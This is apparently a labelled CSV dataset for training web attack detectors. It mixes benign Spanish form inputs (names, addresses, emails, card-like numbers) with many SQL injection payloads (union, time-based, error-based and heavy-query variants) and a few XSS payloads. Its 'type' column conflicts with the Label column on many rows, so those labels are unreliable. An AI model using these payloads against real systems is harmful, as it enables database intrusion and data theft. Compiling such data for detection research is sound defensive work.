Text,attack_type,Label,type
"1"")) as ecnn where 8913=8913 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
rosita,norm,0,normal
42855301e,norm,0,normal
milton,norm,0,normal
07461641g,norm,0,normal
"c/ juan de bustamante, 30, 10b",norm,0,normal
quintanar de la orden,norm,0,normal
roze,norm,0,normal
"1'||(select 'scba' where 9079=9079 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1') union all select null,null,null,null,null#",sqli,1,sql
"royo, el",norm,0,normal
"1""))) rlike sleep(5) and (((""qcqx"" like ""qcqx",sqli,1,normal
c/ codigo correspondencia oficial correos-telegrafos 184,norm,0,normal
bols,norm,0,normal
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
e41t8r,norm,0,normal
-3666') where 6386=6386 union all select 6386--,sqli,1,sql
"a=""get"";b=""url"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",xss,2,xss
comprensin,norm,0,normal
bohlen_newtell@lodgemadrid.it,norm,0,normal
"-9854%""))) or 6455=3652",sqli,1,normal
"-8566"") as hnch where 3418=3418 union all select 3418,3418,3418,3418,3418,3418,3418#",sqli,1,sql
5697356322551108,norm,0,normal
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# cdjm",sqli,1,sql
depaul-macneil@hojainformativas.bv,norm,0,normal
"1' union all select null,null,null,null#",sqli,1,sql
544,norm,0,normal
sibonet,norm,0,normal
monasterio de vega,norm,0,normal
oastler,norm,0,normal
"c/ tamarindo, 109 9e",norm,0,normal
1 or (select * from (select(sleep(5)))ydpu)# lwfs,sqli,1,sql
hadrian,norm,0,normal
3729696342930463,norm,0,normal
9610160798994591,norm,0,normal
"-8054')) union all select 5232,5232,5232,5232,5232,5232,5232#",sqli,1,sql
1);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"1%""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""%""=""",sqli,1,normal
5964,norm,0,normal
"payo gomez 188, 4-c",norm,0,normal
"<img id=xss src="" javascript:alert('xss');"">",xss,2,xss
faada,norm,0,normal
"manuel arnus, 151 9?b",norm,0,normal
"1""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""text"" like ""text",sqli,1,sql
chamberlain@muevemiweb.al,norm,0,normal
"1%"") union all select null,null,null,null,null--",sqli,1,sql
"c/ la magdalena 187,",norm,0,normal
palma de cervell la,norm,0,normal
16966742x,norm,0,normal
"1));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
1'||(select 'kuxp' where 7123=7123 and 1688=4200#,sqli,1,sql
coripe,norm,0,normal
"1"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""bvdv"" like ""bvdv",sqli,1,sql
wambsgan,norm,0,normal
steven,norm,0,normal
evacuacin,norm,0,normal
ilise2,norm,0,normal
"1%' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
roccardi.betten@carrillo-de-albornoz.mil,norm,0,normal
soussa,norm,0,normal
gavota,norm,0,normal
"-3667%')) union all select 3560,3560,3560--",sqli,1,sql
8115,norm,0,normal
"-4346') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
muntada,norm,0,normal
"1' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
boony,norm,0,normal
briviesca,norm,0,normal
1')) rlike sleep(5) and (('tufg'='tufg,sqli,1,normal
espuna angullo,norm,0,normal
-fisiolgicamente,norm,0,normal
"nuestra seora de la paz, 80 8f",norm,0,normal
46704601l,norm,0,normal
pennebak,norm,0,normal
portelan9,norm,0,normal
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('swua' like 'swua",sqli,1,sql
1)) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((7594=7594,sqli,1,sql
"1'||(select 'svgd' from dual where 5188=5188 union all select null,null,null,null,null#",sqli,1,sql
"1' and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"-3249'))) union all select 6309,6309#",sqli,1,sql
crislogo,norm,0,normal
8412575121393763,norm,0,normal
coacu_9ado,norm,0,normal
5521,norm,0,normal
"calle levi, 12 2-c",norm,0,normal
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",sqli,1,sql
1'+(select ggah where 3263=3263 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))+',sqli,1,sql
33437614f,norm,0,normal
"-7267) union all select 1912,1912,1912,1912,1912,1912,1912,1912--",sqli,1,sql
tewksbur,norm,0,normal
"1"" and make_set(8403=8403,8899)",sqli,1,normal
"1""))) and 5429=9596",sqli,1,normal
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",sqli,1,sql
"1')));select count(*) from generate_series(1,5000000) and ((('ldqq'='ldqq",sqli,1,sql
limaco,norm,0,normal
-9700') or 8811=7862,sqli,1,normal
8180,norm,0,normal
burgoa planells,norm,0,normal
"capataz manuel pajaro, 38 2?d",norm,0,normal
1498074049868909,norm,0,normal
mead-neudorfer4@joyclub.au,norm,0,normal
"-5032' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
07953,norm,0,normal
4281924940103467,norm,0,normal
"-5210"") where 7176=7176 or 6872=6872--",sqli,1,sql
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)-- ixlk",sqli,1,sql
"1"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""stcv""=""stcv",sqli,1,normal
7953912981751706,norm,0,normal
ag77avacin,norm,0,normal
"-9698) as pvhn where 3223=3223 or elt(6563=9210,9210)--",sqli,1,sql
7410007052744340,norm,0,normal
1) where 2223=2223;(select * from (select(sleep(5)))acdk)#,sqli,1,sql
t443,norm,0,normal
"""http://www.google.com./"">xss</a>",xss,2,normal
gu5cima,norm,0,normal
1) or sleep(5) and (2211=2211,sqli,1,normal
"1%"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""%""=""",sqli,1,sql
"partida lliriet d'en mig, 135, 10?a",norm,0,normal
-8404)) order by 1--,sqli,1,sql
1'+(select 'unpz' where 8186=8186;select (case when (2593=3592) then 2593 else 2593*(select 2593 from information_schema.character_sets) end)#,sqli,1,sql
hossana,norm,0,normal
"pl. quintero baez, 137",norm,0,normal
-9556 or (2049=6967)*6967# mhbc,sqli,1,normal
7590918469472640,norm,0,normal
7581478216887390,norm,0,normal
"1'+(select qymy where 8657=8657 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1' where 8950=8950 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
8961254211923124,norm,0,normal
"iif(9229=4158,1,1/0)",sqli,1,normal
maestre camprubi,norm,0,normal
monteys bold,norm,0,normal
teuian_balbo@manuelpaloma.ky,norm,0,normal
beardsley@bidrain.lv,norm,0,normal
"pl. san anton, 102",norm,0,normal
pl. obra sindical del hogar 43 5-a,norm,0,normal
5714357879809256,norm,0,normal
"1"") where 6809=6809 rlike (select * from (select(sleep(5)))sgvo)--",sqli,1,sql
27001,norm,0,normal
reig femenia,norm,0,normal
zaqueo,norm,0,normal
edmonds,norm,0,normal
"1));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
1134273490923216,norm,0,normal
30388165j,norm,0,normal
"1') where 3331=3331 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
rhett,norm,0,normal
largar,norm,0,normal
zacaras,norm,0,normal
"1%') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('%'='",sqli,1,normal
trasabuela,norm,0,normal
1') union all select null--,sqli,1,sql
45110,norm,0,normal
1 where 3802=3802 and 2006=2006,sqli,1,normal
50140,norm,0,normal
"1' in boolean mode) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)#",sqli,1,normal
tronchn,norm,0,normal
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1%');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('%'='",sqli,1,sql
navacerrada cosp,norm,0,normal
"1)) and 3824=benchmark(5000000,md5(0x76555642)) and ((8280=8280",sqli,1,normal
40176,norm,0,normal
c/ sahagun 142,norm,0,normal
"tejado, el",norm,0,normal
"-9514)) as xdkw where 4975=4975 union all select 4975,4975,4975,4975#",sqli,1,sql
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",sqli,1,sql
"1"";select benchmark(5000000,md5(0x4c4d6142))",sqli,1,sql
tossa de mar,norm,0,normal
survey,norm,0,normal
1) and (7557=1711)*1711 and (5157=5157,sqli,1,normal
"<input type=""image"" src=""javascript:alert('crosssitescripting');"">",xss,2,xss
277,norm,0,normal
"1%"");begin user_lock.sleep(5); end and (""%""=""",sqli,1,sql
forslund,norm,0,normal
ae57f5r4,norm,0,normal
makazaga millares,norm,0,normal
2112641225180222,norm,0,normal
desca.der9r,norm,0,normal
khanvali,norm,0,normal
rossenberck,norm,0,normal
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",sqli,1,sql
28,norm,0,normal
1));begin dbms_lock.sleep(5); end and ((2160=2160,sqli,1,sql
3893864101962581,norm,0,normal
"1') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1' where 4253=4253;waitfor delay '0:0:5'--,sqli,1,sql
noy,norm,0,normal
17534,norm,0,normal
meli portugal,norm,0,normal
18347,norm,0,normal
1';waitfor delay '0:0:5' and 'fjpf' like 'fjpf,sqli,1,sql
"1%"") or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (""%""=""",sqli,1,sql
10960,norm,0,normal
"1' where 7190=7190 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
84443986s,norm,0,normal
diezma,norm,0,normal
39197,norm,0,normal
"calle nuestra seora del portal s/n,",norm,0,normal
cotten@comodepilarse.cm,norm,0,normal
"1) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
pintipara8a,norm,0,normal
esteban,norm,0,normal
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('qgrt'='qgrt",sqli,1,sql
"1""))) and (select * from (select(sleep(5)))fzno) and (((""uncg""=""uncg",sqli,1,sql
calle bernat de santa eugenia 90,norm,0,normal
1'))) or (select * from (select(sleep(5)))ydpu) and ((('brhc' like 'brhc,sqli,1,sql
1 where 8180=8180 or sleep(5)#,sqli,1,normal
"calle sol s/n,",norm,0,normal
brunstin,norm,0,normal
en6l46h636,norm,0,normal
"1"" order by 1#",sqli,1,normal
"1"" where 9230=9230;(select * from (select(sleep(5)))srmq)--",sqli,1,sql
1') and 6969=(select 6969 from pg_sleep(5)),sqli,1,sql
sangres,norm,0,normal
"1 where 6100=6100 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
sparky,norm,0,normal
roderigo,norm,0,normal
pindi@cortinasartesol.tm,norm,0,normal
34170,norm,0,normal
7onom9niaca,norm,0,normal
3945926912768707,norm,0,normal
eastman@beesmer.lu,norm,0,normal
$ventador,norm,0,normal
"1') as bxae where 4143=4143 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1,sql
pangborne@europop.mw,norm,0,normal
burns-gerron@100mbps.ht,norm,0,normal
"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""seci""=""seci",sqli,1,sql
"1')) as kfnt where 8090=8090 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
3748ny,norm,0,normal
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'='qjle",sqli,1,sql
humfrid,norm,0,normal
1657191621298298,norm,0,normal
1)) as jvoo where 5116=5116 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
inanimada,norm,0,normal
"1"") where 4426=4426 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
isart schwarzenberg,norm,0,normal
20180,norm,0,normal
farraron,norm,0,normal
cenheg,norm,0,normal
"1'+(select 'qzcx' where 9524=9524 and elt(3069=8430,8430))+'",sqli,1,sql
"1')) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"-1859' union all select 1781,1781,1781,1781#",sqli,1,sql
forns rigall,norm,0,normal
1';select (case when (8642=6049) then 1 else 8642*(select 8642 from master..sysdatabases) end)--,sqli,1,sql
7840274194886704,norm,0,normal
37170,norm,0,normal
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# urzg",sqli,1,normal
langmann@fest-tv.sd,norm,0,normal
xtiva,norm,0,normal
vilajosa larrumbe,norm,0,normal
"1'+(select kqac where 4362=4362 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1' and elt(1210=1210,sleep(5)) and 'yhpp' like 'yhpp",sqli,1,normal
cabredo,norm,0,normal
1))) and sleep(5)#,sqli,1,normal
33544296s,norm,0,normal
buenache de la sierra,norm,0,normal
el-hawar,norm,0,normal
05198,norm,0,normal
sa5na,norm,0,normal
"-1370'))) or elt(1032=1032,3623) and ((('xmrg'='xmrg",sqli,1,normal
tordera savall,norm,0,normal
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('raus'='raus",sqli,1,sql
"1%')) union all select null,null,null,null,null,null--",sqli,1,sql
"-7553%"" or 3571=2886",sqli,1,normal
"calle sagristans, 132,",norm,0,normal
vistabella,norm,0,normal
a3ado,norm,0,normal
sinatra@cementoscalibra.mil,norm,0,normal
"1';iif(9007=3836,1,1/0)",sqli,1,sql
fuentiduea,norm,0,normal
ohmaru,norm,0,normal
i02tent0,norm,0,normal
"1"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
villaseca de uceda,norm,0,normal
"1"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""lide""=""lide",sqli,1,sql
aldea del cano,norm,0,normal
9327671462034435,norm,0,normal
kriko,norm,0,normal
franceschini,norm,0,normal
verani@viajesdacapalla.gq,norm,0,normal
crast_litel@cortell.al,norm,0,normal
(select (case when (1570=6977) then 1 else 1570*(select 1570 from mysql.db) end)),sqli,1,sql
"c/ pintores zubiaurre, 156,",norm,0,normal
4960204900106795,norm,0,normal
"1'+(select sfmz where 4870=4870 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
4898771590601702,norm,0,normal
sutorius.sambeek@apicultor.mil,norm,0,normal
"1%') or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1'||(select 'bvic' from dual where 4839=4839 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))||'",sqli,1,sql
colosse@velaconsultores.gob,norm,0,normal
"1"" and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
"1"")) as tkmd where 3415=3415 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
cladera,norm,0,normal
"1"") where 1700=1700 union all select null,null,null,null,null#",sqli,1,sql
32806661j,norm,0,normal
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('pwpc'='pwpc",sqli,1,sql
4m4or6711a662,norm,0,normal
odelia,norm,0,normal
vazkn,norm,0,normal
lightnin@grupodescansoyhogar.web,norm,0,normal
c/ marquesa de vilallonga 53 5f,norm,0,normal
